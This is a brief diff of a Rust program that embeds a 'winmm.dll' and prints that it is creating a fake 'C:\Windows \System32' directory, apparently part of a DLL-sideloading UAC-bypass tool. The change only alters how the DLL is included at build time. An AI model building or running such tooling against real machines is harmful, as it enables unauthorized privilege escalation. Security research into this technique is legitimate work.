@@ -1,6 +1,6 @@
 use std::{fs, io::Error, os::windows::process::CommandExt, process::Command};
 
-static WINMM_DLL: &[u8] = std::include_bytes!(concat!(env!("OUT_DIR"), "/winmm.dll"));
+static WINMM_DLL: &[u8] = std::include_bytes!(env!("CARGO_CDYLIB_FILE_DLL"));
 
 pub fn main() -> Result<(), Error> {
     println!(r"[+] Creating fake directory C:\Windows \System32\...");
